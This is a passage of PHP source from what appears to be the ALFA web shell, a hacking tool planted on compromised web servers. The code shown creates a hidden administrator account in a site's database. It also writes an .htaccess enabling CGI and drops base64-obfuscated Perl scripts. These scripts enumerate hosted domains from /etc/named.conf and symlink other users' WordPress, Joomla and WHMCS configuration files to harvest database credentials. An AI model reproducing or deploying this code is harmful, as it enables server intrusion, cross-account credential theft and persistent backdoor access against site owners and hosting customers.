$solevisible=@mysql_query("insert into ".prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> ";
}
}
}
echo "</div>";
alfafooter();
}
function alfasymlink()
{
alfahead();
$solevisible8 = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$solevisible55=explode('/',$solevisible8 );
$solevisible8 =str_replace($solevisible55[count($solevisible55)-1],'',$solevisible8 );
echo '<div class=header><script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_="";</script><center><h3><span>| Symlink |</span></h3><center><h3><a href=# onclick="g(\'symlink\',null,\'website\',null)">| Domains(Cpanel) | </a><a href=# onclick="g(\'symlink\',null,null,\'whole\')">| Whole Symlink(Cpanel) | </a><a href=# onclick="g(\'symlink\',null,null,null,null,null,null,\'direct\')">| Whole Symlink(Direct-Admin) | </a><a href=# onclick="g(\'symlink\',null,null,null,\'config\')">| Config Symlink | </a><a href=# onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a><a href=# onclick="g(\'symlink\',null,null,null,null,null,\'cfucker\')">| Config Fucker | </a></h3></center>';
if(isset($_POST['alfa8']) && $_POST['alfa8']=='userpl')
{
mkdir('userpl',0755);
chdir('userpl');
$solevisible7 = '.htaccess';
$solevisible6 = "$solevisible7";
$solevisible4 = fopen ($solevisible6 ,'w') or die ('ERROR!!!');
$solevisible5 = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .alfa
AddHandler cgi-script .alfa
AddHandler cgi-script .alfa';
fwrite ( $solevisible4 ,$solevisible5 ) ;
fclose ($solevisible4);
$solevisible3 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPi46OlNvbGV2c2libGUgR0VULVVzZXImZG9tYWluIFNoZWxsZXI6Oi48L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCi5uZXdTdHlsZTEgew0KIGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQogZm9udC1mYW1pbHk6ICJDb3VyaWVyIE5ldyIsIENvdXJpZXIsIG1vbm9zcGFjZTsNCiBmb250LXNpemU6IGxhcmdlOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KDQoNCg0KDQoNCi5zdHlsZTEgew0KIHRleHQtYWxpZ246IGNlbnRlcjsNCiBjb2xvcjojZmZmZmZmOw0KdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQoJLW1vei10cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlLW91dDstby10cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlLW91dDstd2Via2l0LXRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2Utb3V0O3RyYW5zaXRpb246IGFsbCAwLjNzIGVhc2Utb3V0DQoNCn0NCi5zdHlsZTE6aG92ZXIgew0KIHRleHQtYWxpZ246IGNlbnRlcjsNCiBjb2xvcjojZmYwMDAwOw0KdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQp9DQoNCg0KPC9zdHlsZT4NCjwvaGVhZD4NCg0KPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSI+DQoNCg0KDQonOw0Kb3BlbiAoZDBtYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCkBrciA9IDxkMG1haW5zPjsNCmNsb3NlIGQwbWFpbnM7DQppZiAoJGVycil7DQpwcmludCAoJzxwIGNsYXNzPSJzdHlsZTEiPiZuYnNwOzwvcD48cCBjbGFzcz0ic3R5bGUxIj5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQpkaWUoKTsNCn1lbHNlew0KcHJpbnQgJzxwIGNsYXNzPSJzdHlsZTEiPiZuYnNwOzwvcD4NCjxwIGNsYXNzPSJzdHlsZTEiPjxiPjxiaWc+PGZvbnQgY29sb3I9InJlZCI+Q29kZWQgQnkgPC9mb250Pjxmb250IGNvbG9yPSJncmVlbiI+U29sZSBTYWQgJiBJbnZpc2libGU8L2ZvbnQ+PC9iPjwvYmlnPjxicj48YnI+IDxmb250IGNvbG9yPSJyZWQiPjxiPjxiaWc+Q29udGFjdCA6IDwvYj48L2JpZz48L2ZvbnQ+PGZvbnQgY29sb3I9ImdyZWVuIj48Yj48YmlnPnNvbGV2aXNpYmxlQGdtYWlsLmNvbTwvYj48L2JpZz48L2ZvbnQ+PGJyPjxicj48Zm9udCBjb2xvcj0iZ29sZCI+SGVyZSBJcyBBbGwgRG9taW5zICYgVXNlcnMgOjwvZm9udD48L3A+DQonO30NCmZvcmVhY2ggbXkgJG9uZSAoQGtyKQ0Kew0KaWYoJG9uZSA9fiBtLy4qP3pvbmUgIiguKj8pIiB7Lyl7DQokZmlsZW5hbWU9ICIvZXRjL3ZhbGlhc2VzLyIuJDE7DQokb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7DQpwcmludCAnPHAgY2xhc3M9InN0eWxlMSI+Jy4kMS4nIDogJy4kb3duZXIuJzwvcD4NCic7DQp9DQp9DQpwcmludCc8L2JvZHk+PC9odG1sPic7';
$solevisible1 = fopen('user.alfa','w+');
$solevisible2 = fwrite ($solevisible1 ,base64_decode($solevisible3));
fclose($solevisible1);
chmod('user.alfa',0755);
echo '<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><iframe src=userpl/user.alfa width=100% height=600px frameborder=0></iframe> ';
}
if(isset($_POST['alfa5']) && $_POST['alfa5']=='cfucker')
{
mkdir('alfaconfig',0755);
chdir('alfaconfig');
$solevisible7 = '.htaccess';
$solevisible6 = "$solevisible7";
$solevisible4 = fopen ($solevisible6 ,'w') or die ('ERROR!!!');
$solevisible5 = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .alfa
AddHandler cgi-script .alfa
AddHandler cgi-script .alfa';
fwrite ( $solevisible4 ,$solevisible5 ) ;
fclose ($solevisible4);
$solevisible3 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Tb2xldmlzaWJsZSBDb25maWcgRnVja2VyPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQouc29sZXZpc2libGUgew0KICAgIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogICAgZm9udC1zaXplOiAxNHB4Ow0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgIGNvbG9yOiAjMzMzM2ZmOw0KICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICB0ZXh0LXNoYWRvdzogYmxhY2sgMHB4IDBweCAycHg7DQp9DQojY2hlY2tvdXR0ZXh0YXJlYSB7DQoNCiAgd2Via2l0LWJvcmRlci1yYWRpdXM6IDE1cHg7DQoNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1vc2NvbS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictb3Njb21tZXJjZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNob3Atc2hvcHBpbmcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywka29sYS4nLWFtZW1iZXIyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21lbWJlcnMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nLTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy1mb3J1bS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy1mb3J1bXMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLictNS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nLTQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy13cC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9XUC93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtV1AudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtd3AtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy1wcmVzcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLXdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9Xb3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtd29yZHByZXNzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywka29sYS4nLXdwLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1ob21lLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywka29sYS4nLXdwLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3Atc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLictNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJy03LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29sYS4nLTgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRrb2xhLictOS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLictMTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1wcm90YWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvby50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1zaXRlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLW1haW4udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLW5ldy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1ob21lLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictaW5jbHVkZXMtdmIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLWNlbnRyYWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobS13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vV0hNQ1MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobWMtV0hNLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHAudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2VjdXJlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1Y3VyZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1Y3VyZS13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY3BhbmVsLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictaG9zdC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RpbmcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRrb2xhLictd2htY3MyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWNsaWVudGVzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50c3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmcudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tbXkudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tbXlzaG9wLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC16ZW5jYXJ0LnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLVpDc2hvcC50eHQnKTsgDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywka29sYS4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGtvbGEuJy1zbWYyLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRrb2xhLictc21mLWZvcnVtLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywka29sYS4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLXVwLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC91cC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLXVwMi50eHQnKTsgDQp9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ic29sZXZpc2libGUiIGJnY29sb3I9IiMwMDAwMDAiPg0KPHA+U29sZXZpc2libGVbQUxGQSBURWFNXSBDb25maWcgRnVja2VyPC9wPg0KPHA+c29sZXZpc2libGVbYXRdZ21haWwuY29tPC9wPg0KPHNwYW4+PGZvbnQgY29sb3I9InJlZCI+bm90ZTo8L2ZvbnQ+IGVudGVyIHBhc3N3ZD0+IDxmb250IGNvbG9yPSIjRkZGRkZGIj5jYXQgL2V0Yy9wYXNzd2Q8L2ZvbnQ+PC9zcGFuPjxiciAvPg0KPGJyIC8+PGZvcm0gbWV0aG9kPSJwb3N0Ij48c3Ryb25nPg0KPHRleHRhcmVhIGlkPSJjaGVja291dHRleHRhcmVhIiBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOjNweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6ICA0OThweDsgaGVpZ2h0OiAzNzBweDsgYmFja2dyb3VuZC1jb2xvcjojRkZGRkZGOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo